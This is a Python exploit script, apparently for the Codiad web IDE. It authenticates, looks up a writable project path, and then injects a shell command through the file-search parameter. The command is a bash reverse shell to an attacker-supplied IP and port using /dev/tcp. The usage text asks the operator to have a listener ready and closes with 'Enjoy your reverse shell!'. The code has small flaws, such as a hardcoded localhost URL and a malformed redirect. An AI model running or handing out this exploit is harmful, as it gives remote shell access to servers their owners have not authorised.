#!/usr/bin/env python
# encoding: utf-8

import requests
import sys
import json

session = requests.Session()

def login(domain, username, password):
    global session
    url = domain + "/components/user/controller.php?action=authenticate"
    data = {
        "username":username,
        "password":password,
        "theme":"default",
        "language":"en"
    }
    response = session.post(url, data=data)
    content = response.content
    print "[+] Login Content : %s" % (content)
    if content == '{"status":"success","data":{"username":"admin"}}':
        return True

def get_write_able_path():
    global session
    url = "http://localhost/components/project/controller.php?action=get_current"
    response = session.get(url)
    content = response.content
    print "[+] Path Content : %s" % (content)
    json_obj = json.loads(content)
    if json_obj['status'] == "success":
        return json_obj['data']['path']
    else:
        return False

def exploit(domain, username, password, ip, port, path):
    global session
    url = domain + "components/filemanager/controller.php?action=search&path=%s" % (path)
    data = {
        "search_string":"SniperOJ",
        "search_file_type":"SniperOJ\"\n/bin/bash -c 'sh -i >& /dev/tcp/%s/%s+0>&1'\ngrep \"SniperOJ" % (ip, port)
    }
    session.post(url, data=data)

def main():
    if len(sys.argv) != 6:
        print "Usage : "
        print "        python %s [URL] [USERNAME] [PASSWORD] [IP] [PORT]" % (sys.argv[0])
        print "Example : "
        print "        python %s http://127.0.0.1/ admin admin 8.8.8.8 8888" % (sys.argv[0])
        print "Author : "
        print "        WangYihang <wangyihanger@gmail.com>"
        exit(1)
    domain = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    ip = sys.argv[4]
    port = sys.argv[5]
    print "[+] Please confirm that you have started tcp port : [%s] listening on your vps : [%s]" % (ip, port)
    raw_input("[Y/n]")
    print "[+] Starting..."
    if not login(domain, username, password):
        print "[-] Login failed! Please check your username and password."
        exit(2)
    print "[+] Login success!"
    print "[+] Getting writeable path..."
    path = get_write_able_path()
    if path == False:
        print "[+] Get current path error!"
        exit(3)
    print "[+] Writeable Path : %s" % (path)
    print "[+] Sending payload..."
    exploit(domain, username, password, ip, port, path)
    print "[+] Exploit finished!"
    print "[+] Enjoy your reverse shell!"


if __name__ == "__main__":
    main()
